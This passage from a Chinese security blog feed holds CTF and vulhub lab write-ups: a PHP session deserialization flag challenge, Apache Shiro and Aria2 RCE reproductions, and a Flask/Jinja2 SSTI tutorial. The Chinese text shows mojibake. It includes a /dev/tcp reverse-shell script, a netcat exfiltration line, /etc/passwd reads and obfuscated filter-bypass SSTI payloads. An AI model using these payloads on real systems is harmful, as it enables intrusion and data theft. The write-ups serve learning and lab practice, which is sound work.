<p><code>a:2:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
<p><code>s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;</code> è¿™æ ·è¿™é‡Œçš„s:8çš„å€¼ä¸º<code>&quot;;s:51:&quot;</code></p>
<p>a:2:{s:8:â€<em><strong>â€œ;s:51:â€</strong></em>â€œ;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;}</p>
<p>è¿™æ ·ä¸¤å¯¹é”®å€¼ä¸º <code>&quot;;s:51:&quot;</code> <code>aaa</code>   å’Œ <code>img</code> <code>ZDBnM19mMWFnLnBocA==</code> }åé¢çš„å†…å®¹</p>
<p><code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>å‡ä¼šå½“ä½œåƒåœ¾å‚æ•°å¿½ç•¥æ‰</p>
<p><img src="/posts/7c19cc12/2.PNG"></p>
<p>è¿™æ · file_get_contents()è¯»å–<code>d0g3_f1ag.php</code>çš„å†…å®¹</p>
<p><strong>payload</strong></p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}</p>
</blockquote>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>base64(d0g3_fllllllag) = L2QwZzNfZmxsbGxsbGFn</p>
<p>payload</p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;}    </p>
</blockquote>
<p>å¾—åˆ°flag<code>flag&#123;7d55f960-c93d-4db0-8524-f51d073ce4db&#125;</code></p>
<p><img src="/posts/7c19cc12/3.PNG"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<p><a href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
<p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>shiroååºåˆ—åŒ–å¤ç°</title>
    <url>/posts/135e71ec/</url>
    <content><![CDATA[<h3 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h3><blockquote>
<p>Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰<br>Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚<br>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
</blockquote>
<p>shiro æä¾›äº†RememberMeåŠŸèƒ½ï¼Œå¯¹rememberMeçš„cookieåšäº†åŠ å¯†å¤„ç†ï¼Œå½“ç”¨æˆ·æˆåŠŸç™»å½•åshiroåœ¨CookieRememberMeManaerç±»ä¸­å°†cookieä¸­rememberMeå­—æ®µå†…å®¹åˆ†åˆ«è¿›è¡Œ <strong>åºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼Œbase64ç¼–ç ã€‚</strong></p>
<p>ç›¸å¯¹çš„ï¼Œåœ¨è¯†åˆ«èº«ä»½æ˜¯ä¼šå¯¹cookieçš„RememberMeå­—æ®µè¿›è¡Œè§£å¯†å¤„ç†ï¼Œè§£å¯†é¡ºåºä¸º    <strong>è·å–RememberMe cookie ï¼Œbase64è§£å¯†ï¼Œ AESè§£å¯†ï¼Œ ååºåˆ—åŒ–</strong></p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶åºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼Œbase64ç¼–ç ä¹‹åä½œä¸ºcookieçš„RememberMe å­—æ®µå‘é€å‡ºå»ï¼Œshiroä¼šå°†RememberMeè¿›è¡Œè§£å¯†å¹¶ååºåˆ—åŒ–ï¼Œä»è€Œé€ æˆååºåˆ—åŒ–æ¼æ´.</p>
<br>

<br>

<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>kali : 192.168.87.128</p>
<p>Ubuntu : 192.168.87.129</p>
<p><code>docker-compose up -d</code> è®¿é—®<code>192.168.87.129:8080</code></p>
<p>ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œå‹¾é€‰rememberme,è´¦å·å¯†ç åˆ†åˆ«ä¸º<code>admin</code>,<code>vulhub</code></p>
<p><img src="/posts/135e71ec/bp1.png"></p>
<p>æäº¤è¡¨å•å,å¯ä»¥çœ‹åˆ°set-cookieçš„remeberMe=deleteMe</p>
<br>

<p><img src="/posts/135e71ec/1.PNG"></p>
<p><img src="/posts/135e71ec/2.PNG"></p>
<p>åœ¨kaliä¸Šå¼€å¯ç›‘å¬ </p>
<p><code>nc -lvvp 6666</code></p>
<p><img src="/posts/135e71ec/3.PNG"></p>
<p><img src="/posts/135e71ec/4.PNG"></p>
<p><img src="/posts/135e71ec/shell.png"></p>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2RCEæ¼æ´å¤ç°</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><p>Aria2 æ˜¯ä¸€æ¬¾å‘½ä»¤è¡Œä¸‹è½»é‡çº§ã€å¤šåè®®ã€å¤šæ¥æºçš„ä¸‹è½½å·¥å…·ï¼ˆæ”¯æŒ HTTP/HTTPSã€FTPã€BitTorrentã€Metalinkï¼‰ï¼Œå†…å»ºXML-RPCå’ŒJSON-RPCæ¥å£ã€‚åœ¨æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨RPCæ¥å£æ¥æ“ä½œaria2æ¥ä¸‹è½½æ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸‹è½½è‡³ä»»æ„ç›®å½•ï¼Œé€ æˆä¸€ä¸ªä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p><code>docker-compose up -d</code></p>
<p>aria2çš„rpcæœåŠ¡ç«¯å£é»˜è®¤ä¸º6800ï¼Œå¯åŠ¨ç¯å¢ƒåè®¿é—® <code>192.168.159.128:6800</code> burpsuiteæŠ“åŒ…åå‘ç°è¿”å›ä¸º404</p>
<p>å› ä¸º rpc é€šä¿¡éœ€è¦ä½¿ç”¨ json æˆ–è€… xmlï¼Œä¸å¤ªæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰æ–¹ UI æ¥å’Œç›®æ ‡é€šä¿¡ï¼Œè¿™æ˜¯ä¸€æ¬¾è½»é‡çº§webå†™å…¥å·¥å…·</p>
<p><code>http://binux.github.io/yaaw/demo/</code></p>
<p>ç‚¹å‡»å³ä¸Šè§’çš„è®¾ç½®è¿›è¡Œä¿¡æ¯é…ç½®</p>
<p><img src="/posts/undefined/settings.png"></p>
<br>

<p>å¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œå°†shellå‡†å¤‡å¥½ï¼Œshellæ–‡ä»¶è¦åœ¨linuxç¯å¢ƒä¸‹å»ç”Ÿäº§ï¼Œå› ä¸ºLinuxå’Œwindowsä¸‹çš„æ¢è¡Œç¬¦ä¸åŒ</p>
<p>kali ï¼š 192.168.159.129</p>
<p>Ubuntu ï¼š 192.168.159.128</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line">/bin/sh <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">159.129</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python2 ï¼špython2 -m SimpleHTTPServer 8000<br>Python3 ï¼špython3 -m http.server 8000</p>
<p><img src="/posts/undefined/add_task.png"></p>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ— æ³•ä¸‹è½½æ–‡ä»¶ï¼Œä¹‹å‰å»æµ‹è¯•ä¸‹è½½åˆ«çš„ä¸œè¥¿ï¼Œä¹Ÿæ— æ³•å»ä¸‹è½½â€¦ä¸€ç›´æŠ¥é”™<code>Error: Internal server error</code></p>
<p>æŸ¥äº†ä¸‹æŠ¥é”™åŸå›  è¯´æ˜¯å› ä¸ºæ²¡æœ‰æ‰¾åˆ° Aria2 è¿›ç¨‹ï¼Œä½†æ˜¯åœ¨vulhub dockerç¯å¢ƒä¸­å·²ç»å¼€æ”¾äº†ï¼Œè¯•äº†å‡ æ¬¡æœ€ç»ˆè¿˜æ˜¯æ²¡æ‰¾åˆ°åŸå› â€¦.åç»­çš„åˆ©ç”¨crondä»»åŠ¡åå¼¹shellä¹Ÿå°±æ²¡æ³•å®ç°äº†ã€‚<br>ä¹‹åæœ‰æ—¶é—´å†å»å¤ç°ä¸€ä¸‹å§.</p>
]]></content>
      <categories>
        <category>Aria2</category>
      </categories>
      <tags>
        <tag>Aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask_ssti</title>
    <url>/posts/83c81c44/</url>
    <content><![CDATA[<h3 id="æ¨¡æ¿æ³¨å…¥"><a href="#æ¨¡æ¿æ³¨å…¥" class="headerlink" title="æ¨¡æ¿æ³¨å…¥"></a>æ¨¡æ¿æ³¨å…¥</h3><p>ssti æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå¤šå­˜åœ¨äºpythonçš„jinja2,django,tornado,mako æ¡†æ¶  phpçš„tiwg,smartyæ¡†æ¶ javaæ¡†æ¶jade velocity</p>
<p>åœ¨ä¸æ­£ç¡®ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œä¼šé€ æˆæ¨¡æ¿æ³¨å…¥ï¼Œä¼šé€ æˆRCEï¼Œä»»æ„æ–‡ä»¶è¯»å–ç­‰æ¼æ´ï¼Œå¤šå‡ºç°å†ctfä¸­.</p>
<p><img src="/posts/83c81c44/ssti.png"></p>
<br>

<hr>
<h3 id="çŸ¥è¯†å‡†å¤‡"><a href="#çŸ¥è¯†å‡†å¤‡" class="headerlink" title="çŸ¥è¯†å‡†å¤‡"></a>çŸ¥è¯†å‡†å¤‡</h3><ul>
<li><p><code>__class__</code>         è¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»</p>
<p>   <img src="/posts/83c81c44/1.png"></p>
</li>
<li><p><code>__base__</code>        ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç¬¬ä¸€ä¸ªç±»</p>
</li>
<li><p><code>__bases__</code>        ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»</p>
</li>
<li><p><code>__mro__</code>            è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåº</p>
<p>  <img src="/posts/83c81c44/2.png"></p>
</li>
<li><p><code>__subclasses__()</code>        è¿”å›è¿™ä¸ªç±»çš„æ‰€æœ‰å­ç±»çš„é›†åˆ</p>
<p>  <img src="/posts/83c81c44/3.png"></p>
</li>
<li><p><code>__globals__</code>    <code>function.__global__</code>  è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä»¥ä½¿ç”¨çš„moduleã€æ–¹æ³•åŠæ‰€æœ‰å˜é‡</p>
</li>
<li><p><code>__init__</code>        åˆå§‹åŒ–ç±»</p>
</li>
<li><p><code>__builtins__</code>     å¯ä»¥åˆ©ç”¨<code>__import__</code> <code>eval</code>æ‰§è¡Œå‘½ä»¤</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>
<br>

<p><code>&#39;&#39;.__class__.__mro__[-1]</code>ä¸º<code>&lt;class &#39;object&#39;&gt;</code></p>
<p>pythonä¸­çš„ç±»éƒ½æ˜¯ç»§æ‰¿objectçš„ï¼Œæ‰€ä»¥è¦è°ƒç”¨objectç±»çš„<code>__subclasses__()</code>å»å¾—åˆ°æˆ‘ä»¬æƒ³è¦ä½¿ç”¨çš„ç±»çš„å¯¹è±¡ï¼Œ</p>
<br>

<p>åˆ©ç”¨sstiè¦åšçš„ä¸»è¦ä¸ºä¸¤ç‚¹</p>
<ul>
<li>è¯»å–æ–‡ä»¶å†…å®¹</li>
<li>æ‰§è¡Œå‘½ä»¤</li>
</ul>
<p>é‚£åªéœ€è¦å»å¯»æ‰¾ os/fileç­‰å…³é”®å­—</p>
<p>ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨objectç±»ä¸‹çš„ <code>&lt;class &#39;os._wrap_close&#39;&gt;</code>çš„<code>popen</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[:<span class="number">200</span>]):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="vulhubä¸Šçš„flask-ssti"><a href="#vulhubä¸Šçš„flask-ssti" class="headerlink" title="vulhubä¸Šçš„flask ssti"></a>vulhubä¸Šçš„flask ssti</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h4 id="å…³é”®è¯­å¥"><a href="#å…³é”®è¯­å¥" class="headerlink" title="å…³é”®è¯­å¥"></a>å…³é”®è¯­å¥</h4><p><code>t = Template(&quot;Hello &quot; + name)</code></p>
<p>åˆ©ç”¨getä¼ å‚è¿›å…¥templateï¼Œæ„é€ æ³¨å…¥è¯­å¥</p>
<h4 id="éªŒè¯è¯­å¥"><a href="#éªŒè¯è¯­å¥" class="headerlink" title="éªŒè¯è¯­å¥"></a>éªŒè¯è¯­å¥</h4><p><img src="/posts/83c81c44/ssti1.png"></p>
<p><img src="/posts/83c81c44/ssti2.png"></p>
<p><img src="/posts/83c81c44/ssti3.png"></p>
<h4 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h4><p><code>t = Template(&quot;Hello &quot; + &#123;&#123;defense&#125;&#125;)</code></p>
<h4 id="å®˜æ–¹POC"><a href="#å®˜æ–¹POC" class="headerlink" title="å®˜æ–¹POC"></a>å®˜æ–¹POC</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><code>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data) </code></p>
<hr>
<h3 id="buuoj-ssti"><a href="#buuoj-ssti" class="headerlink" title="buuoj ssti"></a>buuoj ssti</h3><p><img src="/posts/83c81c44/buuoj1.png"></p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯flask jinja2 çš„æ¨¡æ¿    (å¦‚æœè¿”å›çš„æ˜¯25 åˆ™æ˜¯Twigæ¨¡æ¿)</p>
<p><img src="/posts/83c81c44/buuoj2.png"></p>
<p><img src="/posts/83c81c44/buuoj3.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj4.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()&#125;&#125;</code>æˆ–è€…</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code>è·å–objectçš„å¯ä»¥åˆ©ç”¨çš„ç±»</p>
<p><img src="/posts/83c81c44/buuoj5.png"></p>
<p>ä½¿ç”¨è„šæœ¬éå†æ‰¾åˆ°åˆ©ç”¨çš„ç±»</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj6.png"></p>
<p>åˆ©ç”¨<code>.__init__.__globals__</code>æ¥æ‰¾osç±»ä¸‹çš„ï¼Œ<code>__init__</code>åˆå§‹åŒ–ç±»ï¼Œç„¶å<code>__globals__</code>å…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj7.png"></p>
<p>åˆ©ç”¨<code>popen</code>å»è¯»å–æ–‡ä»¶</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27dir%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj8.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%27).read()&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[%27eval%27]("__import__(%27os%27).popen(%27ls%27).read()")&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj9.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27whoami%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj10.png"></p>
<p>çœ‹çœ‹/appä¸‹é¢æœ‰ä»€ä¹ˆå†…å®¹</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%20/app%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj11.png"></p>
<p>çœ‹çœ‹server.py</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27cat%20/app/server.py%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj12.png"></p>
<p>å¾—åˆ°flag <code>n1book&#123;eddb84d69a421a82&#125; </code></p>
<br>

<hr>
<h3 id="å¯èƒ½ä¼šç”¨åˆ°çš„payload"><a href="#å¯èƒ½ä¼šç”¨åˆ°çš„payload" class="headerlink" title="å¯èƒ½ä¼šç”¨åˆ°çš„payload"></a>å¯èƒ½ä¼šç”¨åˆ°çš„payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;ls &#x2F;app&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls | nc 127.0.0.1 1234&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  &#x2F;var&#x2F;www&#x2F;html&quot;).read()&#39; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#39;+&#39;ad()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> å¦‚æœè¿‡æ»¤äº†[]ç­‰æ‹¬å·  </p>
<p>  ä½¿ç”¨ <code>__gititem__</code></p>
<p><code>&#123;&#123;%27%27.__class__.__bases__[0]&#125;&#125; </code>       â€“&gt;      <code> &#123;&#123;%27%27.__class__.__bases__.__getitem__(0)&#125;&#125;</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45669205/article/details/114373785">https://blog.csdn.net/weixin_45669205/article/details/114373785</a></p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p><a href="http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/">http://www.cl4y.top/ssti%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0/</a></p>
<p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy--1/p/12841941.html</a></p>
<p><a href="http://ctf.ieki.xyz/library/ssti.html">http://ctf.ieki.xyz/library/ssti.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ssti</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntuå®‰è£…pip2</title>
    <url>/posts/2a2a2884/</url>
    <content><![CDATA[<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¯ç”¨ universe æºä»“åº“</span><br><span class="line">sudo add-apt-repository universe</span><br><span class="line"></span><br><span class="line">sudo proxychains4 wget https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py </span><br><span class="line"></span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu_apt-getå®‰è£…æ—¶æŠ¥é”™</title>
    <url>/posts/e46255d2/</url>
    <content><![CDATA[<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;</span><br><span class="line">sudo mv info&#x2F; info_bak          # ç°å°†infoæ–‡ä»¶å¤¹æ›´å</span><br><span class="line">sudo mkdir info                 # å†æ–°å»ºä¸€ä¸ªæ–°çš„infoæ–‡ä»¶å¤¹</span><br><span class="line">sudo apt-get update             # æ›´æ–°</span><br><span class="line">sudo apt-get -f install         # ä¿®å¤</span><br><span class="line">sudo mv info&#x2F;* info_bak&#x2F;        # æ‰§è¡Œå®Œä¸Šä¸€æ­¥æ“ä½œåä¼šåœ¨æ–°çš„infoæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆä¸€äº›æ–‡ä»¶ï¼Œç°å°†è¿™äº›æ–‡ä»¶å…¨éƒ¨ç§»åˆ°info_bakæ–‡ä»¶å¤¹ä¸‹</span><br><span class="line">sudo rm -rf info                # æŠŠè‡ªå·±æ–°å»ºçš„infoæ–‡ä»¶å¤¹åˆ æ‰</span><br><span class="line">sudo mv info_bak info           # 